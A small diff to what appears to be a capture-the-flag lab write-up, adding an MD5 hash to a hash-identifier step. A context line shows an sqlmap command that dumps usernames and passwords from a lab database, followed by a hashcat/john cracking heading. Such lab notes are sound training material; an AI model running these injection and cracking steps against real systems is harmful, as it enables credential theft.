@@ -59,7 +59,7 @@ sqlmap -r request.txt --batch -D THM_f0und_m3 -T user -C username,password --sql
 ```
 
 ```md5
-hash-identifier
+hash-identifier 05f3672ba34409136aa71b8d00070d1b
 ```
 ##### hashcat (or john)
 
